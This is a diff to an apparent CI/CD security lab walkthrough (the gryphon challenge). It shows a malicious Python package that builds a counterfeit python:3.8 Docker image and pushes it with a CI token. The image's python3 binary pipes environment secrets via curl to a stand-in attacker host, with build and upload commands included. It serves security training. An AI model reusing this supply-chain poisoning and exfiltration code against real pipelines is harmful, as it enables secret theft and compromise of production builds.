@@ -1,5 +1,5 @@
 [![CICD-SEC-3 Dependency Chain Abuse](https://img.shields.io/badge/CICD--SEC--3-Dependency%20Chain%20Abuse-brightgreen)](https://www.cidersecurity.io/top-10-cicd-security-risks/dependency-chain-abuse/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_100422)
-
+[![CICD-SEC-6 Insufficient Credential Hygiene](https://img.shields.io/badge/CICD--SEC--6-Insufficient%20Credential%20Hygiene-brightgreen)](https://www.cidersecurity.io/top-10-cicd-security-risks/insufficient-credential-hygiene/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_100422)
 
 Let's explore what we have when signing in to the compromised GitLab:
 You are the maintainer of *pygryphon* package, there are also public projects *nest-of-gold* and *awesome-app* which we have a read-only access.
@@ -11,9 +11,9 @@ A simple search tells us it is being referenced by *nest-of-gold* project
 
 ![grpyhon](../images/gryphon-1.png "grpyhon")
 
-<BR><BR><BR>
+<BR>
 We can see that *Flag11* is used in a pipeline that ships a container used in production.
-Let's go to this pipeline scheduling, we can see that user named "gryphon" is the owner of this pipeline, and this user is also the owner of the *awesome-app* project's pipeline.
+Let's go to this pipeline scheduling, we can see that user named "gryphon" is the is involved in this pipeline, and this user is also the invovled in the *awesome-app* project's pipeline.
   
 Diving into *awesome-app*, it is using our pygrphon package as a dependency!  
 this is what the *requirments.txt* file looks like:
@@ -26,7 +26,7 @@ flask==2.0.3
 Werkzeug==2.0.3
 pygryphon==1.0.13
 ```
-<BR><BR><BR>
+<BR>
 
 This means we can influence *awesome-app* pipeline by uploading a new malicious python package of *pygrphon*.
 Our end goal is within *nest-of-gold* project, how can we influence it's pipeline?
@@ -60,6 +60,7 @@ import subprocess
 DOCKERFILE = """FROM python:3.8
 COPY python3 /usr/local/bin/
 COPY python3 /usr/local/bin/pip3"""
+# Exfiltrate Flag11, replace attacker server with public facing server, you may ngrok or simliar tools
 PYTHON3 = """#!/bin/bash
 env | grep FLAG11 | curl -X POST --data-binary @- https://ATTACKER[.]SERVER/"""
 
@@ -72,26 +73,37 @@ def run(cmd):
 
 def hello(name):
     """
-    This function greets to
-    the person passed in as
-    a parameter
+    We will build and push a malicous docker image as if it were python 3.8, but in fact 
+    the python3 binary will be our evil script
     """
     run('apk add docker-cli')
     with open('Dockerfile', 'w') as f:
         f.write(DOCKERFILE)
     with open('python3', 'w') as f:
         f.write(PYTHON3)
+    # Giving our script execution permission    
     run('chmod +x python3')
+    # Building the docker file
     run('DOCKER_HOST=tcp://docker:2375 docker build -t gitlab:5050/wonderland/nest-of-gold/python:3.8 .')
+    # Login to the docker registry using TOKEN
     run('DOCKER_HOST=tcp://docker:2375 docker login -u gryphon -p $TOKEN $CI_REGISTRY')
-    run('DOCKER_HOST=tcp://docker:2375 docker push gitlab:5050/wonderland/nest-of-gold/python:3.8')
+    # Pusing to the registry our malicious python docker image
+    run('DOCKER_HOST=tcp://docker:2375 docker push gitlab:5050/wonderland/nest-of-gold/python:3.8')    
     return "Hello, " + name
 ```
 
 And then build and upload this package to gryphon package registry (after we have configured "gitlab" as our a package registry 
-  
+
+Conveniently you may use these files to build the package:  
+
+[.pypirc](/tests/data/pygryphon./.pypirc)
+<BR>
+[pyproject.toml](/tests/data/pygryphon./pyproject.toml)
+
+
 ```sh
 pipenv run python3 -m build [path_to_package]
 pipenv run python3 -m twine upload -r gitlab
 ```
 
+Now prepare a cup of coffe ☕️ and wait for the two pipelines scheduling to take place, excpet the flag arriving to your http server.
